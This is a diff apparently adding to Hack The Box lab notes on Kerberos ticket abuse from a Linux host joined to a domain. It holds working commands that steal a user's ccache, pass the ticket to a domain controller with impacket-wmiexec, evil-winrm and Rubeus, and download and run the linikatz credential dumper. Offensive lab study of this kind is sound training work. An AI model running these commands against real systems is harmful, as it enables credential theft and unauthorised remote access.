@@ -334,7 +334,39 @@ ps -ef | grep -i "winbind\|sssd"
 find / -name *keytab* -ls 2>/dev/null
 
 crontab -l
+
+id julio@inlanefreight.htb
 ```
 <img width="1164" height="554" alt="image" src="https://github.com/user-attachments/assets/568b191c-fb0a-4737-b7fd-f1669cd370bf" />
 
+## Importing the ccache file into our current session
+```bash
+klist
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+smbclient //dc01/C$ -k -c ls -no-pass
 
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+proxychains impacket-wmiexec dc01 -k
+
+sudo apt-get install krb5-user -y
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+<img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/63821327-613c-4d07-9e13-94bf34d85519" />
+
+## ccache to kirbi
+```bash
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+```powershell
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+klist
+dir \\dc01\julio
+```
+
+## Linikatz download and execution
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
+```
